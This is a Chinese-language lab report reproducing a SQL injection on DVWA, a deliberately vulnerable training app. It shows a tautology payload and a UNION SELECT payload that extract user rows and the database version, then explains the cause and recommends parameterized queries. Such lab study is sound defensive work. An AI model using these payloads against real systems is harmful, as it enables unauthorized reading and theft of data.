# 🧪 DVWA SQL 注入（SQLi）漏洞复现报告

> 本报告复现了 DVWA 中的 SQL 注入漏洞，通过构造恶意 SQL 语句获取数据库信息，演示其攻击原理与危害，并提出修复建议。

---

## 🧾 一、实验信息

- 📅 实验时间：2025 年 7 月 9 日  
- 💻 实验系统：Kali Linux（物理机）  
- 🌐 靶场平台：DVWA（Damn Vulnerable Web Application）  
- 🔒 漏洞类型：SQL 注入（SQL Injection）  
- 🔧 难度设置：Low

---

## 📌 二、漏洞页面路径

```text
http://localhost/dvwa/vulnerabilities/sqli/
```

该页面存在用户 ID 查询功能，输入框未对用户输入进行过滤。

## 🧪 三、漏洞复现过程

### 1️⃣ 正常请求示例：

输入：

```
1
```

返回：

```
First name: admin
Surname: admin
```

### 2️⃣ 注入测试 payload：

```
1' or '1'='1
```

✅ 效果：返回多个用户信息，证明注入成功。

📸 截图见下文：`screenshots/sqli_success.png`

![SQLi漏洞](/screenshots/sqli_success.png)

### 3️⃣ 构造信息泄露型 payload（获取数据库版本）：

```
1' union select 1, @@version #
```

✅ 效果：可回显数据库版本信息。

📸 截图：`screenshots/db_dump.png`

![SQLi信息泄露](/screenshots/db_dump.png)

## 💡 四、漏洞原理分析

SQL 注入是由于程序直接将用户输入拼接进 SQL 查询语句，攻击者可构造恶意语句破坏原有逻辑，从而读取、修改、删除数据库中的数据。

## 🎯 五、危害评估

- 获取用户登录信息、密码 hash
- 绕过身份验证
- 删库、数据泄露
- 可作为进一步提权与持久化入口

## 🛡 六、修复建议

- 使用 **预处理语句 / 参数化查询**（如 PDO、mysqli）
- 严格验证与过滤用户输入（白名单机制）
- 错误信息隐藏，防止信息泄露
- 对于返回内容使用 `htmlspecialchars` 转义

## 📚 七、参考链接

- OWASP SQL Injection
- [DVWA GitHub](https://github.com/digininja/DVWA)
